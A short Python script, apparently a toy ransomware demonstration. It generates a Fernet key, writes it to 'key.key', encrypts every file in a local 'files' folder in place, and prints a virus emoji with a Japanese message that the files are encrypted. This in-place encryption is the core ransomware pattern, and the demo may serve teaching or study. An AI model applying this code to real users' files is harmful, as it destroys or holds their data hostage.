from cryptography.fernet import Fernet
import os

KEY = Fernet.generate_key()
cipher = Fernet(KEY)

with open("key.key","wb") as f:
    f.write(KEY)
    
for file in os.listdir("files"):
    path = f"files/{file}"
    with open(path,"rb") as f:
        data = f.read()
        
    encrypted = cipher.encrypt(data)
    
    with open(path, "wb") as f:
        f.write(encrypted)

print("🦠 ファイルは暗号化されました")